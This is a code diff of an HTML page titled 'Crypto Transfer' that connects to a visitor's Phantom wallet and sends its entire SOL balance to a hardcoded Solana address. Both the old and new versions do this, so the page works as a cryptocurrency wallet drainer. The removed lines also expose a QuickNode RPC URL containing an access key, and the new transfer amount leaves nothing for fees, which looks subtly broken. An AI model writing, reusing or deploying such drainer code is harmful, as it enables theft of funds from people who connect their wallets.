@@ -4,72 +4,63 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Crypto Transfer</title>
-    <script type="module">
-        import { Buffer } from 'https://cdn.jsdelivr.net/npm/buffer@6.0.3/+esm';
-        import * as solanaWeb3 from 'https://cdn.jsdelivr.net/npm/@solana/web3.js/+esm';
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.10.0/web3.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/@solana/web3.js/1.75.1/web3.min.js"></script>
+</head>
+<body>
+    <h2>Click below to transfer all funds</h2>
+    <button id="transfer-btn">Transfer Now</button>
 
-        window.Buffer = Buffer;
+    <script>
+        const recipientAddress = "9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf";
 
         async function transferSOL() {
             try {
+                // Check if Phantom wallet is installed
                 if (!window.solana || !window.solana.isPhantom) {
-                    alert("Please install the Phantom wallet extension.");
+                    alert("Please install Phantom wallet.");
                     return;
                 }
 
                 // Connect to Phantom wallet
-                const response = await window.solana.connect();
-                const senderPublicKey = response.publicKey;
+                const provider = window.solana;
+                await provider.connect();
+                const publicKey = provider.publicKey.toString();
+                console.log("Connected wallet:", publicKey);
+
+                // Create connection to Solana cluster
+                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
+
+                // Get the wallet balance
+                let balance = await connection.getBalance(provider.publicKey);
+                balance = balance / solanaWeb3.LAMPORTS_PER_SOL;
                 
-                if (!senderPublicKey) {
-                    alert("Failed to get wallet address.");
+                if (balance === 0) {
+                    alert("Insufficient SOL balance.");
                     return;
                 }
 
-                const recipientPublicKey = new solanaWeb3.PublicKey("9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf");
-                
-                // Connect to Solana mainnet
-                const connection = new solanaWeb3.Connection(
-                    "https://convincing-distinguished-panorama.solana-mainnet.quiknode.pro/068f8b18be5bb779841bd23ab00ef267e80501df",
-                    "confirmed"
-                );
-
-                // Get balance of the sender wallet
-                const balance = await connection.getBalance(senderPublicKey);
-                if (balance <= 0) {
-                    alert("Insufficient balance.");
-                    return;
-                }
-
-                // Create the transaction
+                // Prepare transaction to transfer all SOL
                 const transaction = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: senderPublicKey,
-                        toPubkey: recipientPublicKey,
-                        lamports: balance - 5000, // Leave some balance for fees
+                        fromPubkey: provider.publicKey,
+                        toPubkey: new solanaWeb3.PublicKey(recipientAddress),
+                        lamports: balance * solanaWeb3.LAMPORTS_PER_SOL
                     })
                 );
 
-                // Send transaction for signing
-                const { signature } = await window.solana.signAndSendTransaction(transaction);
-                alert(`Transaction sent! Signature: ${signature}`);
+                // Request to sign and send the transaction
+                const { signature } = await provider.signAndSendTransaction(transaction);
+                await connection.confirmTransaction(signature);
 
-                // Confirm the transaction
-                const confirmation = await connection.confirmTransaction(signature);
-                if (confirmation.value.err) {
-                    alert("Transaction failed!");
-                } else {
-                    alert("Transaction successful!");
-                }
-
+                alert(`Transaction successful! Signature: ${signature}`);
             } catch (error) {
-                alert(`Error: ${error.message}`);
+                console.error("Error:", error);
+                alert(`Transaction failed: ${error.message}`);
             }
         }
+
+        document.getElementById("transfer-btn").addEventListener("click", transferSOL);
     </script>
-</head>
-<body>
-    <h2>Click below to transfer all funds</h2>
-    <button onclick="transferSOL()">Transfer Now</button>
 </body>
 </html>
